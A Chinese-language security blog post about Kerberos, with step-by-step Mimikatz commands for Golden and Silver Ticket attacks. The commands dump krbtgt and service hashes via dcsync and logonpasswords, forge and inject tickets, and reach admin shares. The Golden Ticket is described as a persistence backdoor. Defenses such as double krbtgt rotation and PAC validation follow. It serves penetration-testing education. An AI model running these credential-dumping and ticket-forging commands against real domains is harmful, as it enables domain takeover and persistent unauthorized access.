@@ -1,0 +1,993 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+  <meta charset="UTF-8">
+  <meta 
+    name="viewport"
+    content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+  <meta 
+    http-equiv="X-UA-Compatible" 
+    content="ie=edge">
+  <meta 
+    name="theme-color" 
+    content="#fff" 
+    id="theme-color">
+  <meta 
+    name="description" 
+    content="Chen">
+  <link 
+    rel="icon" 
+    href="/img/favicon.png">
+  <title>金票银票</title>
+  
+    
+      <meta 
+        property="og:title" 
+        content="金票银票">
+    
+    
+      <meta 
+        property="og:url" 
+        content="https://www.zerochen.top/article/%E9%87%91%E7%A5%A8%E9%93%B6%E7%A5%A8/index.html">
+    
+    
+      <meta 
+        property="og:img" 
+        content="/img/logo.png">
+    
+    
+    
+      <meta 
+        property="og:type" 
+        content="article">
+      <meta 
+        property="og:article:published_time" 
+        content="2021-09-23">
+      <meta 
+        property="og:article:modified_time" 
+        content="2021-09-23">
+      <meta 
+        property="og:article:author" 
+        content="沉墨">
+      
+        
+          <meta 
+            property="og:article:tag" 
+            content="票据使用">
+        
+      
+    
+  
+  <script>
+    function loadScript(url, cb) {
+      var script = document.createElement('script');
+      script.src = url;
+      if (cb) script.onload = cb;
+      script.async = true;
+      document.body.appendChild(script);
+    }
+    function loadCSS(href, data, attr) {
+      var sheet = document.createElement('link');
+      sheet.ref = 'stylesheet';
+      sheet.href = href;
+      sheet.dataset[data] = attr;
+      document.head.appendChild(sheet);
+    }
+    function changeCSS(cssFile, data, attr) {
+      var oldlink = document.querySelector(data);
+      var newlink = document.createElement("link");
+      newlink.setAttribute("rel", "stylesheet");
+      newlink.setAttribute("href", cssFile);
+      newlink.dataset.prism = attr;
+      document.head.replaceChild(newlink, oldlink);
+    }
+  </script>
+  
+    
+  
+  <script>
+    // control reverse button
+    var reverseDarkList = {
+      dark: 'light',
+      light: 'dark'
+    };
+    var themeColor = {
+      dark: '#1c1c1e',
+      light: '#fff'
+    }
+    // get the data of css prefers-color-scheme
+    var getCssMediaQuery = function() {
+      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    };
+    // reverse current darkmode setting function
+    var reverseDarkModeSetting = function() {
+      var setting = localStorage.getItem('user-color-scheme');
+      if(reverseDarkList[setting]) {
+        setting = reverseDarkList[setting];
+      } else if(setting === null) {
+        setting = reverseDarkList[getCssMediaQuery()];
+      } else {
+        return;
+      }
+      localStorage.setItem('user-color-scheme', setting);
+      return setting;
+    };
+    // apply current darkmode setting
+  </script>
+  
+    <script>
+      var setDarkmode = function(mode) {
+      var setting = mode || localStorage.getItem('user-color-scheme');
+      if(setting === getCssMediaQuery()) {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+      } else if(reverseDarkList[setting]) {
+        document.documentElement.setAttribute('data-user-color-scheme', setting);
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+      } else {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[getCssMediaQuery()];
+        document.getElementById('theme-color').dataset.mode = getCssMediaQuery();
+      }
+    };
+    setDarkmode();
+    </script>
+  
+  
+  <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
+  <link rel="preload" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" as="style" >
+  
+  
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.js" as="script">
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.css" as="style" >
+  
+  
+    <link rel="preload" href="/js/lib/lozad.min.js" as="script">
+  
+  
+  
+  
+  
+    
+    <link rel="prefetch" href="//unpkg.com/valine/dist/Valine.min.js" as="script">
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
+  
+    <link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+  <body>
+    <div class="wrapper">
+       
+      <nav class="navbar">
+  <div class="navbar-logo">
+    <span class="navbar-logo-main">
+      
+        <img 
+          class="navbar-logo-img" 
+          src="/img/favicon.png" 
+          alt="blog logo">
+      
+      <span class="navbar-logo-dsc">沉墨的小小技术圈</span>
+    </span>
+  </div>
+  <div class="navbar-menu">
+    
+      <a 
+        href="/" 
+        class="navbar-menu-item">
+        
+          首页
+        
+      </a>
+    
+      <a 
+        href="/archives" 
+        class="navbar-menu-item">
+        
+          归档
+        
+      </a>
+    
+      <a 
+        href="/tags" 
+        class="navbar-menu-item">
+        
+          标签
+        
+      </a>
+    
+      <a 
+        href="/categories" 
+        class="navbar-menu-item">
+        
+          分类
+        
+      </a>
+    
+      <a 
+        href="/about" 
+        class="navbar-menu-item">
+        
+          关于
+        
+      </a>
+    
+      <a 
+        href="/links" 
+        class="navbar-menu-item">
+        
+          友链
+        
+      </a>
+    
+    <a 
+      class="navbar-menu-item darknavbar" 
+      id="dark">
+      <i class="iconfont icon-weather"></i>
+    </a>
+    <a 
+      class="navbar-menu-item searchnavbar" 
+      id="search">
+      <i 
+        class="iconfont icon-search" 
+        style="font-size: 1.2rem; font-weight: 400;">
+      </i>
+    </a>
+  </div>
+</nav> 
+      
+      <div 
+        id="local-search" 
+        style="display: none">
+        <input
+          class="navbar-menu-item"
+          id="search-input"
+          placeholder="请输入搜索内容..." />
+        <div id="search-content"></div>
+      </div>
+      
+      <div class="section-wrap">
+        <div class="container">
+          <div class="columns">
+            <main class="main-column">
+<article class="card card-content">
+  <header>
+    <h1 class="post-title">
+      金票银票
+    </h1>
+  </header>
+  <div class="post-meta post-show-meta">
+    <time datetime="2021-09-23T12:54:18.000Z">
+      <i 
+        class="iconfont icon-calendar" 
+        style="margin-right: 2px;">
+      </i>
+      <span>2021-09-23</span>
+    </time>
+    
+      <span class="dot"></span>
+      
+        <a 
+          href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" 
+          class="post-meta-link">
+          内网渗透
+        </a>
+      
+    
+    
+      <span class="dot"></span>
+      <span>1.3k 字</span>
+    
+  </div>
+  
+    <div 
+      class="post-meta post-show-meta" 
+      style="margin-top: -10px;">
+      <div style="display: flex; align-items: center;">
+        <i 
+          class="iconfont icon-biaoqian" 
+          style="margin-right: 2px; font-size: 1.15rem;">
+        </i>
+        
+          
+          <a 
+            href="/tags/%E7%A5%A8%E6%8D%AE%E4%BD%BF%E7%94%A8/" 
+            class="post-meta-link">
+            票据使用
+          </a>
+        
+      </div>
+    </div>
+  
+  </header>
+  <div 
+    id="section" 
+    class="post-content">
+    <h1 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h1><p>一种网络身份验证协议，通过加密技术为客户端、服务端应用程序提供强大的认证服务。涉及三方认证：</p>
+<p>1、访问服务的Client</p>
+<p>2、提供服务的Server</p>
+<p>3、KDC密钥分发中心，KDC又分为AS以及TGS。</p>
+<p><img src="/article/%E9%87%91%E7%A5%A8%E9%93%B6%E7%A5%A8/image-20210923210616717.png" alt="image-20210923210616717" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/%E9%87%91%E7%A5%A8%E9%93%B6%E7%A5%A8/image-20210923210616717.png" class="lozad post-image"></p>
+<p>优点：</p>
+<p>1、高性能，拥有票据后不再需要KDC参与</p>
+<p>2、双向验证（最后一步）</p>
+<p>3、跨平台。ST票据不包含身份信息，只包含确认信息。</p>
+<p>缺点：</p>
+<p>1、对称加密，安全性降低</p>
+<p>2、集中式管理，对域控性能、安全性要求高</p>
+<p>KDC默认安装在域控中，Client和Server为域内用户或服务。Client是否有权限访问Server由KDC发放的票据决定</p>
+<h1 id="金票和银票"><a href="#金票和银票" class="headerlink" title="金票和银票"></a>金票和银票</h1><h2 id="黄金票据（留作后门）"><a href="#黄金票据（留作后门）" class="headerlink" title="黄金票据（留作后门）"></a>黄金票据（留作后门）</h2><p>使用ktbtgt哈希伪造域管账号进行域内任意主机攻击（20分钟内有效）。</p>
+<p>过程：</p>
+<p>1、在域控中获取ktbtgt的hash、sid</p>
+<pre class="highlight"><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:域名 /user:krbtgt&quot; exit		# 抓sid</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit		# 获取hash</span><br></pre>
+
+
+
+<p>2、生成黄金票据（域内主机）</p>
+<pre class="highlight"><span class="line">mimikatz.exe &quot;kerberos::golden /user:伪造的用户名 /domain:域名 /sid:user-sid  /krbtgt:ntlmhash值 /ticket:票据名称&quot; exit</span><br></pre>
+
+<p>参数说明：</p>
+<p>/admin：伪造的用户名</p>
+<p>/domain：域名称</p>
+<p>/sid：域的SID （不包括后3位）</p>
+<p>/krbtgt: krbtgt 的 NTLM-HASH 值</p>
+<p>/ticket:生成的票据名称(如：xx.tgt)</p>
+<p>3、获取权限（域内主机）</p>
+<p>清空本地票据缓存，导入伪造票据</p>
+<pre class="highlight"><span class="line">mimikatz.exe &quot;kerberos::list&quot; exit 	# 查看本地保存的票据，观察client name</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;kerberos::purge&quot; exit 	# 清理本地票据缓存</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;kerberos::ptt xx.tgt&quot; exit 票据名 	# 导入伪造的黄金票据</span><br></pre>
+
+<p>klist # cmd下查看票据</p>
+<p>* 注意：票据20分钟内有效，过期之后可以再次导入</p>
+<p><strong>4、利用</strong>*</p>
+<pre class="highlight"><span class="line">dir \\计算机全名\c$</span><br></pre>
+
+<p>注意：此处必须要用计算机全名或全名+域名，不能是ip。psexec等工具同理</p>
+<p>防御：</p>
+<p>1、限制域管理员登录到除域控制器和少数管理服务器以外的任何其他计算机</p>
+<p>这降低攻击者通过横向扩展，获取域管理员的账户，获得访问域控制器的Active Directory的ntds.dit的权限。如果攻击者无法访问AD数据库（ntds.dit文件），则无法获取到KRBTGT帐户密码。</p>
+<p>2、建议定期更改KRBTGT密码</p>
+<p>更改一次后让AD备份，并在12到24小时后再次更改它。这个过程应该对系统环境没有影响。这个过程应该是确保KRBTGT密码每年至少更改一次的标准方法。</p>
+<p>3、通过快速更改KRBTGT密码两次，使黄金票据失效</p>
+<p>一旦攻击者获得了KRBTGT帐号密码哈希的访问权限，就可以随意创建黄金票据。通过快速更改KRBTGT密码两次，使任何现有的黄金票据（以及所有活动的Kerberos票据）失效，可以消除攻击者使用其KRBTGT创建有效金票的能力。</p>
+<h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><p>通过伪造服务端的hash可以攻击伪造服务端。</p>
+<p>前提：</p>
+<p>1、域名称</p>
+<p>2、域的 SID 值</p>
+<p>3、域的服务账户的密码HASH</p>
+<p>4、伪造的用户名，可以是任意用户名，一般是伪造administrator</p>
+<p>5、需要访问的服务</p>
+<p>过程：</p>
+<p>1、用域管理员账号登录主域控，使用 mimikatz.exe 执行命令抓取hash和sid（在域控中执行）</p>
+<pre class="highlight"><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:域名 /user:krbtgt&quot; exit		# 获取sid</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit		# 获取hash</span><br></pre>
+
+<p>2、伪造票据。得到服务账户的 HASH 之后使用 mimikatz中的kerberos::golden功能生成白银票据TGS ticket。</p>
+<pre class="highlight"><span class="line">mimikatz.exe kerberos::golden /domain:域名 /sid:SID值 /target:目标主机 /rc4:目标主机的HASH值（NTLM）/service:需要伪造的服务 /user:伪造的用户名 /ptt</span><br></pre>
+
+<p>参数：</p>
+<p>/domain：指定域名</p>
+<p>/sid：sid号（除最后一部分）</p>
+<p>/target：目标主机计算机名或ip</p>
+<p>/rc4：目标主机的hash(NTLM)</p>
+<p>/service：需要伪造的服务</p>
+<p>/user：需要伪造的用户名</p>
+<p>/ppt：伪造了以后直接写入到内存中</p>
+<p>服务类型表：</p>
+<table>
+<thead>
+<tr>
+<th>服务类型</th>
+<th>白银票据对应的服务名</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>WMI</td>
+<td>HOST/RPCSS</td>
+</tr>
+<tr>
+<td>PowerShell  Remoting</td>
+<td>HOST/HOST</td>
+</tr>
+<tr>
+<td>WinRM</td>
+<td>HOST/HTTP</td>
+</tr>
+<tr>
+<td>Scheduled  Tasks</td>
+<td>HOST</td>
+</tr>
+<tr>
+<td>Windows File Share (CIFS–net use)</td>
+<td>CIFS</td>
+</tr>
+<tr>
+<td>LDAP  operations including Mimikatz DCSync</td>
+<td>LDAP</td>
+</tr>
+<tr>
+<td>Windows  Remote Server Administration Tools</td>
+<td>RPCSS/LDAP/CIFS</td>
+</tr>
+</tbody></table>
+<p>注：sid在域内任何主机都可以拿到</p>
+<p><strong>3、利用</strong>*</p>
+<pre class="highlight"><span class="line">dir \\计算机全名\c$</span><br></pre>
+
+<p>注意：此处必须要用计算机全名或全名+域名，不能是ip。必须使用pstools中的psexec</p>
+<p>注意：创建的服务票据智只能用于该服务的命令执行</p>
+<p>防御：</p>
+<p>通过开启PAC(Privileged Attribute Certificate)特权属性证书保护功能。开启PAC后，PAC会将client发送的票</p>
+<p>据ticket发送给KDC，由KDC进行验证ticket是否有效，就可以使所伪造的票据无法进行利用。</p>
+<p>在Server端开启的方式是更改注册表中的一个值，将</p>
+<p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters</p>
+<p>中的ValidateKdcPacSignature设为1</p>
+<p>其他：</p>
+<p>ADfind可以抓到sid(winserver2008、2012)</p>
+
+  </div>
+  <div>
+    
+      <div 
+        class="post-note note-warning copyright" 
+        style="margin-top: 42px">
+        <p>
+          <span style="font-weight: bold;">作者：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="/about">
+            沉墨
+          </a>
+        </p>
+        <p>
+          <span style="font-weight: bold;">文章链接：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="https://www.zerochen.top/article/%E9%87%91%E7%A5%A8%E9%93%B6%E7%A5%A8/">
+            https://www.zerochen.top/article/%E9%87%91%E7%A5%A8%E9%93%B6%E7%A5%A8/
+          </a>
+        </p>
+        <p><span style="font-weight: bold;">版权声明：</span>转载请注明出处！</p>
+      </div>
+    
+  </div>
+</article>
+<div class="nav">
+  
+  
+    <div class="nav-item-next">
+      <a 
+        href="/article/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E4%B8%8Ehash%E4%BC%A0%E9%80%92%E5%B0%8F%E7%BB%93/" 
+        class="nav-link">
+        <div>
+          <div class="nav-label">下一篇</div>
+          
+            <div class="nav-title">密码抓取与hash传递小结 </div>
+          
+        </div>
+        <i class="iconfont icon-right nav-next-icon"></i>
+      </a>
+    </div>
+  
+</div>
+
+  <div 
+    class="card card-content comment-card" 
+    style="margin-top: 16px;">
+    <div class="comment-card-title">评论</div>
+    
+  <div id="vcomments"></div>
+  
+  <script>
+    loadScript("//unpkg.com/valine/dist/Valine.min.js");
+    var oldLoadVa = window.onload;
+    window.onload = function () {
+      oldLoadVa && oldLoadVa();
+      new Valine({
+        el: '#vcomments',
+        appId: '2ShT4MB47jbSbE00Kn5TgK8j-gzGzoHsz',
+        appKey: 'eC6yijqvttNWfHdJogIgmhA4',
+        placeholder: '来将何人，可留姓名？',
+        path: window.location.pathname,
+        avatar: 'mp',
+        meta: ["nick","mail","link"],
+        pageSize: '10',
+        lang: '',
+        visitor: 'false',
+        highlight: true,
+        recordIP: false,
+        
+        
+        
+        enableQQ: 'false',
+        requiredFields: [],
+      });
+    };
+  </script>
+
+  </div>
+
+<div 
+  class="card card-content toc-card" 
+  id="mobiletoc">
+  <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Kerberos"><span class="toc-text">Kerberos</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%87%91%E7%A5%A8%E5%92%8C%E9%93%B6%E7%A5%A8"><span class="toc-text">金票和银票</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%EF%BC%88%E7%95%99%E4%BD%9C%E5%90%8E%E9%97%A8%EF%BC%89"><span class="toc-text">黄金票据（留作后门）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-text">白银票据</span></a></li></ol></li></ol>
+</div></main>
+            <aside class="left-column">
+              
+              <div class="card card-author">
+                
+  <img 
+    src="/img/logo.png" 
+    class="author-img" 
+    alt="author avatar">
+
+<p class="author-name">沉墨</p>
+<p class="author-description">谨言多思，野蛮生长</p>
+<div class="author-message">
+  <a 
+    class="author-posts-count" 
+    href="/archives">
+    <span>55</span>
+    <span>文章</span>
+  </a>
+  <a 
+    class="author-categories-count" 
+    href="/categories">
+    <span>11</span>
+    <span>分类</span>
+  </a>
+  <a 
+    class="author-tags-count" 
+    href="/tags">
+    <span>54</span>
+    <span>标签</span>
+  </a>
+</div>
+
+              </div>
+               <div class="sticky-tablet">
+  
+  
+    <article class="display-when-two-columns spacer">
+      <div class="card card-content toc-card">
+        <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Kerberos"><span class="toc-text">Kerberos</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%87%91%E7%A5%A8%E5%92%8C%E9%93%B6%E7%A5%A8"><span class="toc-text">金票和银票</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%EF%BC%88%E7%95%99%E4%BD%9C%E5%90%8E%E9%97%A8%EF%BC%89"><span class="toc-text">黄金票据（留作后门）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-text">白银票据</span></a></li></ol></li></ol>
+      </div>
+    </article>
+  
+  
+  <article class="card card-content categories-widget">
+    <div class="categories-card">
+  <div class="categories-header">
+    <i 
+      class="iconfont icon-fenlei" 
+      style="padding-right: 2px;">
+    </i>分类
+  </div>
+  <div class="categories-list">
+    
+      <a href="/categories/Web%E6%B8%97%E9%80%8F/">
+        <div class="categories-list-item">
+          Web渗透
+          <span class="categories-list-item-badge">20</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/">
+        <div class="categories-list-item">
+          编程基础
+          <span class="categories-list-item-badge">3</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/">
+        <div class="categories-list-item">
+          网络基础
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+        <div class="categories-list-item">
+          漏洞复现
+          <span class="categories-list-item-badge">5</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+        <div class="categories-list-item">
+          环境搭建
+          <span class="categories-list-item-badge">7</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+        <div class="categories-list-item">
+          内网渗透
+          <span class="categories-list-item-badge">9</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Linux/">
+        <div class="categories-list-item">
+          Linux
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Python/">
+        <div class="categories-list-item">
+          Python
+          <span class="categories-list-item-badge">5</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Windows/">
+        <div class="categories-list-item">
+          Windows
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E5%AE%89%E6%9C%8D/">
+        <div class="categories-list-item">
+          安服
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E9%99%84%E5%8A%A0%E6%8A%80%E8%83%BD/">
+        <div class="categories-list-item">
+          附加技能
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  <article class="card card-content tags-widget">
+    <div class="tags-card">
+  <div class="tags-header">
+    <i 
+      class="iconfont icon-biaoqian" 
+      style="padding-right: 2px;">
+    </i>热门标签
+  </div>
+  <div class="tags-list">
+    
+      <a 
+        href="/tags/%E9%9A%8F%E8%AE%B0/" 
+        title="随记">
+        <div class="tags-list-item">随记</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%8F%90%E6%9D%83/" 
+        title="提权">
+        <div class="tags-list-item">提权</div>
+      </a>
+    
+      <a 
+        href="/tags/Redis/" 
+        title="Redis">
+        <div class="tags-list-item">Redis</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%A5%A8%E6%8D%AE%E4%BD%BF%E7%94%A8/" 
+        title="票据使用">
+        <div class="tags-list-item">票据使用</div>
+      </a>
+    
+      <a 
+        href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" 
+        title="逻辑漏洞">
+        <div class="tags-list-item">逻辑漏洞</div>
+      </a>
+    
+      <a 
+        href="/tags/%E8%BE%B9%E7%95%8C%E4%BB%A3%E7%90%86/" 
+        title="边界代理">
+        <div class="tags-list-item">边界代理</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" 
+        title="端口转发">
+        <div class="tags-list-item">端口转发</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" 
+        title="网络协议">
+        <div class="tags-list-item">网络协议</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" 
+        title="权限维持">
+        <div class="tags-list-item">权限维持</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" 
+        title="文件包含">
+        <div class="tags-list-item">文件包含</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" 
+        title="文件上传">
+        <div class="tags-list-item">文件上传</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/" 
+        title="综合靶场">
+        <div class="tags-list-item">综合靶场</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%8D%9A%E5%AE%A2/" 
+        title="博客">
+        <div class="tags-list-item">博客</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81/" 
+        title="直播推流">
+        <div class="tags-list-item">直播推流</div>
+      </a>
+    
+      <a 
+        href="/tags/Nginx/" 
+        title="Nginx">
+        <div class="tags-list-item">Nginx</div>
+      </a>
+    
+      <a 
+        href="/tags/Apache/" 
+        title="Apache">
+        <div class="tags-list-item">Apache</div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
+            <aside class="right-column">
+              <div class="sticky-widescreen">
+  
+  
+    <article class="card card-content toc-card">
+      <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Kerberos"><span class="toc-text">Kerberos</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%87%91%E7%A5%A8%E5%92%8C%E9%93%B6%E7%A5%A8"><span class="toc-text">金票和银票</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%EF%BC%88%E7%95%99%E4%BD%9C%E5%90%8E%E9%97%A8%EF%BC%89"><span class="toc-text">黄金票据（留作后门）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-text">白银票据</span></a></li></ol></li></ol>
+    </article>
+  
+  
+  <article class="card card-content">
+    <div class="recent-posts-card">
+  <div class="recent-posts-header">
+    <i 
+      class="iconfont icon-wenzhang_huaban" 
+      style="padding-right: 2px;">
+    </i>最近文章
+  </div>
+  <div class="recent-posts-list">
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-09-23</div>
+        <a href="/article/%E9%87%91%E7%A5%A8%E9%93%B6%E7%A5%A8/"><div class="recent-posts-item-content">金票银票</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-09-23</div>
+        <a href="/article/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E4%B8%8Ehash%E4%BC%A0%E9%80%92%E5%B0%8F%E7%BB%93/"><div class="recent-posts-item-content">密码抓取与hash传递小结</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-09-12</div>
+        <a href="/article/msf%E5%92%8Cstowaway%E4%BB%A3%E7%90%86/"><div class="recent-posts-item-content">msf和stowaway代理</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-09-04</div>
+        <a href="/article/%E8%BE%B9%E7%95%8C%E4%BB%A3%E7%90%86%E5%8F%8A%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"><div class="recent-posts-item-content">边界代理及端口转发</div></a>
+      </div>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
+          </div>
+        </div>
+      </div>
+    </div>
+     
+    <footer class="footer">
+  <div class="footer-container">
+    <div>
+      <div class="footer-dsc">
+        <span>
+          Copyright ©
+          
+            2020 -
+          
+          2021
+        </span>
+        &nbsp;
+        <a 
+          href="/" 
+          class="footer-link">
+          沉墨的小小技术圈
+        </a>
+      </div>
+    </div>
+
+    
+    
+    
+      <div class="BbeiAn-info">
+        <a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">皖ICP备2021010523号-1 </a>
+      </div>
+      
+        <div class="BbeiAn-info">
+          <span style="padding-left: 25px;background: url(/img/beian.png) no-repeat left center"></span>
+          <a target="_blank" rel="noopener" href="http://www.beian.gov.cn/portal/recordQuery ">皖公网安备 34012202341035号
+          </a>
+          <br />
+        </div>
+      
+    
+    
+      <div class="footer-dsc">
+        
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+        
+          <span>&nbsp;|&nbsp;</span>
+        
+        
+          本站总访客数<span id="busuanzi_value_site_uv"></span>次
+        
+      </div>
+      
+    
+</footer> 
+    
+  <a 
+    role="button" 
+    id="scrollbutton" 
+    class="basebutton" 
+    aria-label="回到顶部">
+    <i class="iconfont icon-arrowleft button-icon"></i>
+  </a>
+
+<a 
+  role="button" 
+  id="menubutton" 
+  class="basebutton">
+  <i class="iconfont icon-menu button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="popbutton" 
+  class="basebutton" 
+  aria-label="控制中心">
+  <i class="iconfont icon-expand button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="darkbutton" 
+  class="basebutton darkwidget" 
+  aria-label="夜色模式">
+  <i class="iconfont icon-weather button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="searchbutton" 
+  class="basebutton searchwidget" 
+  aria-label="搜索">
+  <i class="iconfont icon-search button-icon"></i>
+</a> 
+     
+     
+     
+      <script>
+  var addImgLayout = function () {
+    var img = document.querySelectorAll('.post-content img')
+    var i
+    for (i = 0; i < img.length; i++) {
+      var wrapper = document.createElement('a')
+      wrapper.setAttribute('href', img[i].getAttribute('data-src'))
+      wrapper.setAttribute('aria-label', 'illustration')
+      wrapper.style.cssText =
+        'width: 100%; display: flex; justify-content: center;'
+      if (img[i].alt) wrapper.dataset.caption = img[i].alt
+      wrapper.dataset.nolink = true
+      img[i].before(wrapper)
+      wrapper.append(img[i])
+      var divWrap = document.createElement('div')
+      divWrap.classList.add('gallery')
+      wrapper.before(divWrap)
+      divWrap.append(wrapper)
+    }
+    baguetteBox.run('.gallery')
+  }
+</script>
+<script>
+  loadScript(
+    "/js/lib/lightbox/baguetteBox.min.js",
+    addImgLayout
+  )
+</script>
+ 
+     
+     
+    <script src="/js/main.js"></script> 
+    
+      <script> 
+        loadScript('/js/lib/busuanzi.min.js') 
+      </script>
+     
+    
+      <script>
+        var addLazyload = function () {
+          var observer = lozad('.lozad', {
+            load: function (el) {
+              el.srcset = el.getAttribute('data-src')
+            },
+            loaded: function (el) {
+              el.classList.add('loaded')
+            },
+          })
+          observer.observe()
+        }
+      </script>
+      <script>
+        loadScript('/js/lib/lozad.min.js', addLazyload)
+      </script>
+     
+    
+    
+      <script>
+        setTimeout(() => {localSearch("search.json")}, 0)
+      </script>
+    
+  </body>
+</html>
